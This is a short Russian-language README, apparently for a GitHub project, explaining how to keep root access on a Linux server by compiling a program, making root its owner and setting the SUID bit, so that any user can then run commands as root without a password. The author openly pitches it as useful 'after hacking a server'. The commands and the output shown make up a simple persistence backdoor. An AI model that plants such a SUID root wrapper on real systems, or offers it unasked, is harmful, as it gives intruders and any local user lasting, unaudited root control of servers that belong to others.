# my_sudo

Привет всем, знаю достаточно простой, но действенный способ повысить себе привелегии на сервере, если у вас есть временно права root, но вы нехотите терять эти права.

Это может-быть полезно, либо после взлома сервера например.

Бывают ситуации, когда например у вас есть рутовые привелегии на сервере, но вы нехотите их терять, короче полезно даже в мирных целях.)

Итак, как-то решил я написать программу, которая-бы запускала команды в терминале, с правами рута, но без ввода пароля, да вроде несложная программа, которая просто запускает команды с привилегиями администартора (код можете глянуть в этой ветке на гитхабе).

Идея очень простая, в линуксе есть специальный флаг SUID (Set UID) — программа, у которой установлен этот бит, выполняется с правами хозяина файла программы. Имеет смысл только при установке на исполняемые файлы.

Итак, если мы соберем файл из репозитория:

gcc my_sudo.c -o my_sudo

Далее, устанавливаем владельца и группу root:

chown root:root my_sudo

Устанавливаем флаг SUID:

sudo chmod u+s my_sudo

Проверяем:

ls -l my_sudo

-rwsrwxr-x 1 root root 8896 сен 10 10:49 my_sudo

Всё, теперь можно выполнять команды от рута, без ввода пароля.)

./my_sudo whoami

root
